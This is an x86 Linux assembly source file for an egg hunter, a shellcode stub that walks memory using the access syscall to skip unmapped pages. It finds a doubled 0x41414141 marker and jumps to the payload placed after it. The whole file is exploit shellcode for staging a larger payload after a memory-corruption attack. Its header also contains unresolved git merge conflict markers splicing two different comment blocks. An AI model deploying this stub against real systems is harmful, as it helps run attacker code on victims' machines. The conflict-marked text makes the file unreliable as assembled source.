<<<<<<< HEAD
; access_egghunter.asm
; Author: German Namestnikov
=======
; linux x86 Egg Hunter using access (35 bytes)
; Egg size: 8 bytes
>>>>>>> c18d4cda1f15f7698f05cba09f66df3d30f77e0a
 
global _start
 
section .text
 
_start:

xor edx, edx

page_alignment:
    or dx,0xfff

egg_hunting:
    inc edx
    lea ebx, [edx + 0x04]
    
    push dword 0x21
    pop eax

    int 0x80
    
    cmp al, 0xf2
    jz page_alignment

    mov eax, 0x41414141

    mov edi, edx

    scasd

    jnz egg_hunting
    scasd

    jnz egg_hunting
    jmp edi
